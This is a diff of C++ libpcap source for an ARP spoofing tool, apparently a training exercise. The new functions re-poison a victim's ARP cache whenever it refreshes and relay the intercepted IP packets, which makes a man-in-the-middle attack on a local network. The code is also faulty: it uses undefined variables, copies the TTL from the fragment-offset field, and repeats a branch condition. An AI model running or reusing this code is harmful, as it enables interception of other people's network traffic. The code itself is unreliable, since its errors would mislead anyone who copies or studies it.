@@ -61,10 +61,10 @@ EthArpPacket* receiveArp(int mode, pcap_t *handle)
 		{
 			printf("\n\n------------------------------\n");
 			std::cout << "[*] Arp " << mode_str << " Packet captured..\n";
-			printf("src ip : %s...\n", std::string(Ip(ntohl(arp->arp_.sip_))).data());
-			printf("src mac : %s...\n", std::string(arp->eth_.smac_).data());
-			printf("dst ip : %s...\n", std::string(Ip(ntohl(arp->arp_.tip_))).data());
-			printf("dst mac : %s...\n", std::string(arp->eth_.dmac_).data());
+			printf("src ip : %s\n", std::string(Ip(ntohl(arp->arp_.sip_))).data());
+			printf("src mac : %s\n", std::string(arp->eth_.smac_).data());
+			printf("dst ip : %s\n", std::string(Ip(ntohl(arp->arp_.tip_))).data());
+			printf("dst mac : %s\n", std::string(arp->eth_.dmac_).data());
 			printf("------------------------------\n\n\n");
 			return arp;
 		}
@@ -85,7 +85,7 @@ void getSenderMac(pcap_t *handle, Mac src_mac, Ip src_ip, char *dst_mac, Ip arp_
 	return;
 }
 
-int reinfect(pcap_t *handle, char *send_ip, char *tar_ip)
+bool needToReinfect(pcap_t *handle, char *send_ip, char *tar_ip, char *att_ip)
 {
 	// 'if' condition 1 : broadcast
 	// 'if' condition 2, 3 : broadcast from sender or target
@@ -95,17 +95,109 @@ int reinfect(pcap_t *handle, char *send_ip, char *tar_ip)
         printf("[*] sender arp table refreshed!!\n");
         if(ntohl(pkt->arp_.sip_) == Ip(send_ip))
         {
-            printf("[*] case #1 : sender broadcasts to get target's mac\n");
+            printf("[*] sender broadcasts to get target's mac\n");
         }
-        else if(ntohl(pkt->arp_.sip_) == Ip(tar_ip) && ntohl(pkt->arp_.tip_) == Ip(send_ip))
+        else if(ntohl(pkt->arp_.sip_) == Ip(send_ip) && ntohl(pkt->arp_.tip_) == Ip(tar_ip))
         {
-            printf("[*] case #2 : target broadcasts to get sender's mac\n");
+            printf("[*] target broadcasts to get sender's mac\n");
         }
-        else
+        else if(ntohl(pkt->arp_.tip_) == Ip(tar_ip) )
+		{
+			printf("[*] attacker broadcasts to get target's mac");
+		}
+		else
         {
-            printf("[*] case #3 : target broadcasts to get other host's mac\n");
+            printf("[*] target broadcasts to get other host's mac\n");
         }
-        return 1;
+        return true;
     }
-	return 0;
+	return false;
+}
+
+void relayIpPacket(pcap_t *handle, const u_char *packet)
+{
+	((struct EthIpPacket *)packet)->eth_.smac_ = flow.attackerMac;
+	((struct EthIpPacket *)packet)->eth_.dmac_ = flow.targetMac;
+	SendIp(handle, rePacket, header->len);
+	printf("Relay : %s\n", std::string(flow.senderIp).c_str());
+	while (true)
+	{
+		struct pcap_pkthdr *header;
+		const u_char *ip_packet;
+		int result = pcap_next_ex(handle, &header, &ip_packet);
+		if (result != 1)
+		{
+			continue;
+		}
+		IpPacket *ip = (IpPacket *)ip_packet;
+		
+		// printf("packet ip : %s\n", std::string(Ip(ntohl(ip->ip_.sip_))).data());
+		// printf("send ip : %s\n", std::string(send_ip).c_str());
+		if (ntohl((ip->ip_.sip_)) == send_ip && 
+		ip->eth_.dmac_ == att_mac)
+		{
+			printf("[*] Spoofed ip packet captured..\n");
+			printf("src ip : %s...\n", std::string(Ip(ntohl(ip->ip_.sip_))).data());
+			printf("src mac : %s...\n", std::string(ip->eth_.smac_).data());
+			printf("dst ip : %s...\n", std::string(Ip(ntohl(ip->ip_.dip_))).data());
+			printf("dst mac : %s...\n", std::string(ip->eth_.dmac_).data());
+			IpPacket packet;
+
+			packet.eth_.dmac_ = att_mac;
+			packet.eth_.smac_ = ip->eth_.dmac_;
+			packet.eth_.type_ = htons(EthHdr::Ip4);
+
+			packet.ip_.hl_ = ip->ip_.hl_;
+			packet.ip_.v_ = ip->ip_.v_;
+
+			packet.ip_.tos_ = ip->ip_.tos_;
+
+			packet.ip_.len_ = ip->ip_.len_;
+			packet.ip_.id_ = ip->ip_.id_;
+			packet.ip_.off_ = ip->ip_.off_;
+
+			packet.ip_.ttl_ = ip->ip_.off_;
+			packet.ip_.p_ = ip->ip_.p_;
+			packet.ip_.sum_ = ip->ip_.sum_;
+
+			packet.ip_.sip_ = ip->ip_.sip_;
+			packet.ip_.dip_ = ip->ip_.dip_;
+
+			int res = pcap_sendpacket(handle, reinterpret_cast<const u_char *>(&packet), sizeof(IpPacket));
+			if (res != 0)
+			{
+				fprintf(stderr, "[*] pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
+			}
+			else
+			{
+				printf("\n\n------------------------------\n");
+				printf("[*] Ip packet replay succeeded!");
+				printf("\n------------------------------\n\n");
+			}
+		}
+	}
+}
+
+void spoofProcess(int mode, pcap_t *handle, char* ether_dmac, Mac ether_smac,
+			 Mac arp_smac, char* arp_sip, Mac arp_tmac, Ip arp_tip, char* att_ip)
+{
+	struct pcap_pkthdr *header;
+	const u_char *packet;
+	while(true)
+	{
+		int result = pcap_next_ex(handle, &header, &packet);
+		if (result == 0)
+			continue;
+		if (result == PCAP_ERROR || result == PCAP_ERROR_BREAK)
+		{
+			printf("pcap_next_ex return %d(%s)\n", result, pcap_geterr(handle));
+			break;
+		}
+		if (needToReinfect(handle, ether_dmac, arp_sip, att_ip))
+			sendArp(ArpHdr::Reply, handle, Mac(ether_dmac), Mac(ether_dmac), arp_smac, Ip(arp_sip), arp_tmac, arp_tip);
+		else
+			relayIpPacket(handle, packet);
+			
+	}
+	
 }
